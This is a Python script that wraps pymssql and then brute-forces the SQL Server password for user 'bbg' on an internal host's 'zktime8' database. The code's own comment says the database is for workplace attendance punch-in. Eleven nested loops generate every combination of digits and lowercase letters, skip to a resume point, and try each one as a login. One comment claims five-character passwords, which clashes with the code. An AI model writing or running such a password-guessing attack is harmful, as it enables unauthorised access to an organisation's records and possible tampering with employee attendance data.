import pymssql
import os
import itertools
import string


# 上班考勤打卡
class MSSQL:
    """
    对pymssql的简单封装

    """

    def __init__(self, host, user, pwd, db):
        self.host = host
        self.user = user
        self.pwd = pwd
        self.db = db

    def __GetConnect(self):
        """
        得到连接信息
        返回: conn.cursor()
        """
        if not self.db:
            raise (NameError, "没有设置数据库信息")
        self.conn = pymssql.connect(host=self.host, user=self.user, password=self.pwd, database=self.db, charset="utf8")
        cur = self.conn.cursor()
        if not cur:
            raise (NameError, "连接数据库失败")
        else:
            return cur

    def ExecQuery(self, sql):
        """
        执行查询语句
        返回的是一个包含tuple的list，list的元素是记录行，tuple的元素是每行记录的字段

        调用示例：
                ms = MSSQL(host="localhost",user="sa",pwd="123456",db="PythonWeiboStatistics")
                resList = ms.ExecQuery("SELECT id,NickName FROM WeiBoUser")
                for (id,NickName) in resList:
                    print str(id),NickName
        """
        cur = self.__GetConnect()
        cur.execute(sql)
        resList = cur.fetchall()

        # 查询完毕后必须关闭连接
        self.conn.close()
        return resList

    def ExecNonQuery(self, sql):
        """
        执行非查询语句

        调用示例：
            cur = self.__GetConnect()
            cur.execute(sql)
            self.conn.commit()
            self.conn.close()
        """
        cur = self.__GetConnect()
        cur.execute(sql)
        self.conn.commit()
        self.conn.close()


def main():
    # 密码字符集
    charset = string.printable[:-64]
    # 5位密码
    i = 0
    for ch1 in range(len(charset)):
        for ch2 in range(len(charset)):
            for ch3 in range(len(charset)):
                for ch4 in range(len(charset)):
                    for ch5 in range(len(charset)):
                        for ch6 in range(len(charset)):
                            for ch7 in range(len(charset)):
                                for ch8 in range(len(charset)):
                                    for ch9 in range(len(charset)):
                                        for ch10 in range(len(charset)):
                                            for ch11 in range(len(charset)):
                                                password = str(charset[ch1]) + str(charset[ch2]) + str(
                                                    charset[ch3]) + str(charset[ch4]) + str(charset[ch5]) + str(
                                                    charset[ch6]) + str(charset[ch7]) + str(charset[ch8]) + str(
                                                    charset[ch9]) + str(charset[ch10]) + str(charset[ch11])
                                                i += 1
                                                if i >= 9999999999:  # 断点
                                                    try:
                                                        ms = MSSQL(host="192.168.2.228", user="bbg", pwd=password,
                                                                   db="zktime8")
                                                        query = ms.ExecQuery("SELECT GETDATE() AS CurrentDateTime")
                                                        print('Success!', password, ';', query)
                                                        input('Wait........')
                                                    except Exception as e:
                                                        print('id:', i, '，try:', password, e)


if __name__ == '__main__':
    main()
